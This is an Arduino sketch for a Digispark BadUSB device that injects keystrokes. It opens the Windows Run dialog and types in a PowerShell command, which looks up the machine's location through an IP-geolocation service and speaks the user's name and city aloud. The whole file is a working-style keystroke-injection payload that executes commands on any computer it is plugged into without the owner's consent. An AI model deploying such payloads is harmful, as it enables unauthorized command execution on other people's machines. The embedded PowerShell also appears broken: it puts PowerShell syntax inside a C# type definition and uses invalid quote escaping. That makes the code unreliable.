#include "DigiKeyboard.h"

void setup() {}

void loop() {
  DigiKeyboard.delay(500);

  // Open desktop
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Open Run dialog
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  // Execute PowerShell script for speech synthesis with geolocation
  DigiKeyboard.println("powershell \"Add-Type -TypeDefinition 'public class Speech { public void Speak(string text) { (New-Object -ComObject SAPI.SpVoice).Speak(text); } }'; $location = Invoke-RestMethod -Uri 'http://ip-api.com/json/'; (New-Object Speech).Speak('Don\\'t mind me, ' + [Environment]::UserName + ', I\\'m just a talking computer in ' + $location.city + ', ' + $location.regionName + ', ' + $location.country + '.'); exit;\"");

  while(true) {
    DigiKeyboard.delay(10000); // Prevent re-execution
  }
}
